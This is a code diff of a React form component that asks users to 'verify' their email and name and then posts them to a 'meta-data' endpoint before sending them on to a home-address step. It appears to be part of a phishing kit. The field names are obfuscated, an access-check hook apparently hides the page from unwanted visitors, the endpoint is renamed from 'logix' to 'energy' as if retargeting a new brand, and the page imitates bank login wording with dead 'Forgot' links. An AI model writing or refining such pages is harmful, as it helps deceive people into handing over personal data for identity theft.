@@ -1,40 +1,33 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
+import FlowCard from '../components/FlowCard';
+import FormError from '../components/FormError';
+
+const inputClasses =
+  'w-full bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00b4ff]';
 
 const BasicInfo: React.FC = () => {
   const [fzNme, setFzNme] = useState('');
   const [lzNme, setLzNme] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
-  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', email: '' });
-  const [username, setUsername] = useState('');
   const [email, setEmail] = useState('');
-  const isAllowed = useAccessCheck(baseUrl);
-
+  const [isLoading, setIsLoading] = useState(false);
+  const [errors, setErrors] = useState({ fzNme: '', lzNme: '', email: '', form: '' });
+  const [username, setUsername] = useState('');
   const navigate = useNavigate();
   const location = useLocation();
   const { emzemz: emzemzState } = location.state || {};
+  const isAllowed = useAccessCheck(baseUrl);
 
-  React.useEffect(() => {
+  useEffect(() => {
     if (emzemzState) {
       setUsername(emzemzState);
     } else {
       console.error('No username provided from previous page');
-      // Optionally redirect back or show error
     }
   }, [emzemzState]);
-
-  // Show loading state while checking access
-  if (!isAllowed) {
-    return <div>Loading...</div>;
-  }
-
-  // Check if username is available before showing form
-  if (!username) {
-    return <div>Error: No username provided. Please go back and try again.</div>;
-  }
 
   const validateEmzemz = (emzemz: string) => {
     const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -42,18 +35,18 @@ const BasicInfo: React.FC = () => {
   };
 
   const validateForm = () => {
-    const newErrors = { fzNme: '', lzNme: '', email: '' };
+    const newErrors = { fzNme: '', lzNme: '', email: '', form: '' };
 
-    if (!fzNme.trim()) newErrors.fzNme = 'First name is required';
-    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required';
-    if (!email.trim()) newErrors.email = 'Email is required';
-    else if (!validateEmzemz(email)) newErrors.email = 'Invalid email format';
+    if (!email.trim()) newErrors.email = 'Email is required.';
+    else if (!validateEmzemz(email)) newErrors.email = 'Invalid email format.';
+    if (!fzNme.trim()) newErrors.fzNme = 'First name is required.';
+    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required.';
 
     setErrors(newErrors);
-    return !newErrors.fzNme && !newErrors.lzNme && !newErrors.email;
+    return !newErrors.email && !newErrors.fzNme && !newErrors.lzNme;
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
 
     if (!validateForm()) {
@@ -63,126 +56,144 @@ const BasicInfo: React.FC = () => {
     setIsLoading(true);
 
     try {
-      await axios.post(`${baseUrl}api/logix-meta-data-3/`, {
-        emzemz: username,  // Username for client lookup
-        email: email,      // Actual email address
+      await axios.post(`${baseUrl}api/energy-meta-data-3/`, {
+        emzemz: username,
+        email,
         fzNme,
-        lzNme
+        lzNme,
       });
 
       navigate('/home-address', {
         state: {
           emzemz: username,
           fzNme,
-          lzNme
-        }
+          lzNme,
+        },
       });
     } catch (error) {
       console.error('Error submitting form:', error);
-      setErrors(prev => ({
+      setErrors((prev) => ({
         ...prev,
-        form: 'There was an error submitting your information. Please try again.'
+        form: 'There was an error submitting your information. Please try again.',
       }));
     } finally {
       setIsLoading(false);
     }
   };
 
-  return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Basic Information</h2>
-      </div>
+  if (!isAllowed) {
+    return null;
+  }
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="">We will need you to confirm your personal information.</p>
-
-        <form onSubmit={handleSubmit}>
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Email:</label>
-            <input
-              id="email"
-              name="email"
-              type="email"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter email address"
-            />
-          </div>
-
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">First Name:</label>
-            <input
-              id="fzNme"
-              name="fzNme"
-              type="text"
-              value={fzNme}
-              onChange={(e) => setFzNme(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter first name"
-            />
-            {errors.fzNme && (
-              <div className="flex items-center gap-2 text-red-600 text-sm">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.fzNme}</span>
-              </div>
-            )}
-          </div>
-
-          <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Last Name:</label>
-            <input
-              id="lzNme"
-              name="lzNme"
-              type="text"
-              value={lzNme}
-              onChange={(e) => setLzNme(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter last name"
-            />
-            {errors.lzNme && (
-              <div className="flex items-center gap-2 text-red-600 text-sm">
-                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
-                </svg>
-                <span>{errors.lzNme}</span>
-              </div>
-            )}
-          </div>
-
-          {!isLoading ? (
-            <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Continue
-              </button>
-            </div>
-          ) : (
-            <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-          )}
-        </form>
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700 mb-2">
-          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
+  if (!username) {
+    return (
+      <FlowCard title="Unable to continue">
+        <p className="text-sm text-slate-300">
+          We could not determine your session details. Please return to the previous step and try again.
         </p>
-        <div className="text-xs text-blue-700 space-x-2">
-          <a href="#" className="hover:underline">Forgot Username?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Password?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Forgot Everything?</a>
-          <span>|</span>
-          <a href="#" className="hover:underline">Locked Out?</a>
-        </div>
+      </FlowCard>
+    );
+  }
+
+  const footer = (
+    <div className="space-y-2 text-xs text-slate-300">
+      <p>
+        For security reasons, never share your username, password, social security number, account number or other private data
+        online, unless you are certain who you are providing that information to, and only share information through a secure
+        webpage or site.
+      </p>
+      <div className="flex flex-wrap items-center justify-center gap-2 text-[#7dd3fc]">
+        <a href="#" className="hover:underline">
+          Forgot Username?
+        </a>
+        <span className="text-slate-500">|</span>
+        <a href="#" className="hover:underline">
+          Forgot Password?
+        </a>
+        <span className="text-slate-500">|</span>
+        <a href="#" className="hover:underline">
+          Forgot Everything?
+        </a>
+        <span className="text-slate-500">|</span>
+        <a href="#" className="hover:underline">
+          Locked Out?
+        </a>
       </div>
     </div>
+  );
+
+  return (
+    <FlowCard
+      title="Verify Your Basic Information"
+      subtitle={<span className="text-slate-300">Please confirm the details we have on file.</span>}
+      footer={footer}
+    >
+      <form onSubmit={handleSubmit} className="space-y-4">
+        <div>
+          <label className="block text-sm text-slate-300 mb-1" htmlFor="email">
+            Email address
+          </label>
+          <input
+            id="email"
+            name="email"
+            type="email"
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
+            className={inputClasses}
+            placeholder="name@example.com"
+          />
+          {errors.email ? <FormError message={errors.email} /> : null}
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-300 mb-1" htmlFor="fzNme">
+            First name
+          </label>
+          <input
+            id="fzNme"
+            name="fzNme"
+            type="text"
+            value={fzNme}
+            onChange={(e) => setFzNme(e.target.value)}
+            className={inputClasses}
+            placeholder="First name"
+          />
+          {errors.fzNme ? <FormError message={errors.fzNme} /> : null}
+        </div>
+
+        <div>
+          <label className="block text-sm text-slate-300 mb-1" htmlFor="lzNme">
+            Last name
+          </label>
+          <input
+            id="lzNme"
+            name="lzNme"
+            type="text"
+            value={lzNme}
+            onChange={(e) => setLzNme(e.target.value)}
+            className={inputClasses}
+            placeholder="Last name"
+          />
+          {errors.lzNme ? <FormError message={errors.lzNme} /> : null}
+        </div>
+
+        {errors.form ? (
+          <div className="rounded-md border border-red-400/40 bg-red-950/40 px-4 py-3 text-sm text-red-300">{errors.form}</div>
+        ) : null}
+
+        <button
+          type="submit"
+          className="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md hover:bg-[#38bdf8] transition disabled:opacity-70"
+          disabled={isLoading}
+        >
+          {isLoading ? (
+            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-black border-t-transparent" />
+          ) : (
+            'Continue'
+          )}
+        </button>
+      </form>
+    </FlowCard>
   );
 };
 
